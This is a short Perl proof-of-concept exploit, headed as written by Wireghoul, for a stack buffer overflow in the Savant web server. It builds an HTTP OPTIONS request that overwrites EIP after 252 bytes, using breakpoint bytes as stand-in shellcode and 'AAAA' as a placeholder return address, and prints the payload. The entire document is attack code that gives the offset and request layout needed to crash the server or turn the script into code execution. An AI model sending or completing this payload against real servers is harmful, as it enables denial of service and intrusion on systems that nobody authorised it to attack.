#!/usr/bin/perl
# Savant Web server Stack corruption BoF exploit
# Written by Wireghoul - http://www.justanotherhacker.com

$dist = 252; #distance to EIP
$EIP = "AAAA";
$shellcode = "\xcc" x $dist;

$payload = "OPTIONS / ";
$payload.="$shellcode$EIP\r\nUser-Agent: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\r\n\r\n";
print $payload;
